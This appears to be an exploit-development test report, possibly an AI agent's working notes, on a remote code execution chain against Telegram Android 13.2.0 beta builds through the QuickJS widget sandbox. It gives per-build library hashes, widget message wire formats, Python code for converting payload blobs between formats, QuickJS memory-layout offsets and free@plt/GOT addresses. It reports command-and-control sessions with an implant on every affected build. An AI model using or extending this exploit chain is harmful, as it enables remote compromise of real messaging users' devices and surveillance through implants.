# Telegram Android beta APK matrix — 2026-11-05

Scope: every beta APK found in `apks/` (10 files), arm64-v8a
`libtmessages.49.so`, widget RCE profile `arm64-qjs-72799-72879`.
The payload under test is the plaintext text-only loader
`poc/loader_v7_plain_text_cec.html` (3,056 B zlib, 7,460 B raw).

The file names omit the trailing `9` of the version code:

| file | versionName | versionCode |
|---|---|---:|
| `13.1.1 (7249).apk` | 13.1.1 | 72499 |
| `13.1.2 (7250).apk` | 13.1.2 | 72509 |
| `13.1.2 (7253).apk` | 13.1.2 | 72539 |
| `13.2.0 (7254).apk` | 13.2.0 | 72549 |
| `13.2.0 (7255).apk` | 13.2.0 | 72559 |
| `13.2.0 (7256).apk` | 13.2.0 | 72569 |
| `13.2.0 (7260).apk` | 13.2.0 | 72609 |
| `13.2.0 (7278).apk` | 13.2.0 | 72789 |
| `13.2.0 (7279).apk` | 13.2.0 | 72799 |
| `13.2.0 (7287).apk` | 13.2.0 | 72879 |

## Result

**All 13.2.0 beta builds pass with the same 3,056 B loader.** 13.1.x has no
`assets/WidgetSandbox` and no widget-media TL class, so the widget/QuickJS
attack surface does not exist there.

| versionCode | WidgetSandbox | arm64 lib size | lib sha256 (16) | media class | test |
|---:|---|---:|---|---|---|
| 72499 | no | 22,137,896 | `fdd40260ec844063` | none | N/A |
| 72509 | no | 22,137,896 | `fdd40260ec844063` | none | N/A (same lib as 72499) |
| 72539 | no | 22,146,272 | `640adc179aed897b` | none | N/A |
| 72549 | yes | 26,857,648 | `23b833a71ffce2b5` | old `#b7ed7b0d` | **proof 5496** |
| 72559 | yes | 26,857,648 | `23b833a71ffce2b5` | old | **proof 5499** |
| 72569 | yes | 26,857,648 | `23b833a71ffce2b5` | old | **proof 5500** |
| 72609 | yes | 26,950,464 | `fed61e0fc2a424d0` | new `#2238f214` + `_old` | **proof 5497** |
| 72789 | yes | 26,997,240 | `7d54541a7d03104c` | new + `_old` | **proof 5498** |
| 72799 | yes | 27,016,000 | `1b756d81fdf07bce` | new + `_old` | **proof 5503** |
| 72879 | yes | 27,061,432 | `e83e517a77bec68e` | new + `_old` | **proof 5501/5502** (and 5489/5492/5493) |

All proofs are full C2 sessions: `exec rc=0`, implant
`tg-10357-XQ-BT52`, uid 10357.

### Duplicate libs vs distinct libs

- `72499 == 72509`
- `72549 == 72559 == 72569`
- `72609`, `72789`, `72799`, `72879` are distinct libraries.

The three 72549/72559/72569 APKs were nevertheless all tested because their
`WidgetJS` sandbox bundles differ even though the native library is identical
(72549 manifest `261dff…`, 72559/72569 manifest `d34741…`).

## Full lib hashes

```text
72499/72509 fdd40260ec8440635a945bdb6c4c12e6d2993785923a9879e61e1da9c6847ad6
72539       640adc179aed897b8055aca35275dcbb72341d72e41b99261f65b6eca5056e53
72549/72559/72569
            23b833a71ffce2b586774ace27094dfbe5ce0b5e46172c687acb03b9cbc62efd
72609       fed61e0fc2a424d06a42e58bef9b919c7fcbddb84c4da41f0f12e03a29bcea9c
72789       7d54541a7d03104c11f45a6bd4caf496feae0c4e48bf5223cb7444e66542876f
72799       1b756d81fdf07bce3a0ef39579f91b591a244f21acd29a01738ac91459bf6db0
72879       e83e517a77bec68e565b96218969cb1fad1007f160a1450dc6c7fd9344d90984
```

## Widget media format changed at 72609

`TL_messageMediaWidget` inside `messages_v2.data` has two wire formats:

- **old, 72549**: constructor `0xb7ed7b0d`
  (`messageMediaWidget`), fields in order
  `width:int32`, `height:int32`, `payload:bytes` (zlib HTML).
- **new, 72609+**: constructor `0x2238f214`, fields
  `flags:int32`, `width:int32`, `height:int32`, `payload:bytes`, then
  optional `public_data` / `chat_data` / widget metadata.  The new clients
  keep `TL_messageMediaWidget_old` (`0xb7ed7b0d`) and
  `TL_messageMediaWidget_layer233` (`0xa...`) compatibility classes.

Consequences:

- 72549 accepts **only** the old media; a 72879-format message is rejected
  with `TLParseException: can't parse magic 2238f214` and never renders.
- 72609/72789/72799/72879 accept old media too (tested on 72609/72789), so a
  single old-media DB fixture works from 72549 through 72789.
- 72799/72879 were tested with the new-media fixture produced by
  `tools/widget_tool.py`.

`tools/widget_tool.py` only understands the new media.  The old-media
conversion used for 72549 is:

```python
OLD = 0xb7ed7b0d
m = blob.find(struct.pack('<I', OLD))
w, h = struct.unpack_from('<ii', blob, m + 4)
payload, poff, end = wt._decode_bytes(blob, m + 12)
tail = blob[end:]
new = blob[:m] + struct.pack('<Iiii', 0x2238f214, 1, 480, 320)
new += wt._encode_bytes(payload) + tail
```

and the reverse (new -> old):

```python
m, flags, w, h, payload, poff, end = wt.extract(blob)
tail = blob[end:]
old = struct.pack('<Iii', 0xb7ed7b0d, 480, 320)
old += wt._encode_bytes(payload)
new = blob[:m] + old + tail
```

## What stayed fixed across 13.2.0

The QuickJS object layout / ctx chain is unchanged across 72549 -> 72879:

```text
shape+48 -> proto, proto+32 -> prop, ctor+48 -> ctx, ctx+16 -> rt,
rt+16 -> js_free, rt+64 -> opaque
class 64, stride 64; byte_length +0, max +4; class_id +16 (29/30);
u.ptr +56, u.array.count +64
```

The native `js_def_free` stub exists in every 13.2.0 library:

| build | `js_def_free` stub | free@plt | free GOT |
|---:|---|---:|---:|
| 72549 | `0x1734fec` | `0x188b9e0` | `0x193dd68` |
| 72609 | `0x174b1ac` | `0x18a1be0` | `0x19547f0` |
| 72789 | `0x1739aec` | `0x18accf0` | `0x1960430` |
| 72799 | `0x173e36c` | `0x18b1580` | `0x1964cc0` |
| 72879 | `0x174926c` | `0x18bc480` | `0x196fef0` |

All are `mov x0,x1; b free@plt`; the payload reads the stub through
`rt+16` and decodes the PLT/GOT at runtime.  No per-build loader constants
were needed.

## 13.1.x

72499/72509/72539 have no `assets/WidgetSandbox`, no `sandbox-bundle.qbc`, and
no `TL_messageMediaWidget` class.  The QuickJS widget engine that contains
PR#1827 is not present; these builds are out of scope for this RCE path.

## Final device state

- App: 13.2.0 (72879), installed from `apks/13.2.0 (7287).apk`.
- DB: restored from the 72879 backup, both widget rows 79528/79622 contain the
  3,056 B plaintext loader (`comp=3056 html=7460`).
- App alive (pid 30727 at the end of the run); C2 stopped.
- Backups: `/tmp/opencode/apk_tests/cache4.72879.db` (clean 72879 DB),
  `/tmp/opencode/apk_tests/72549/cache4.after.db` (old-media DB).
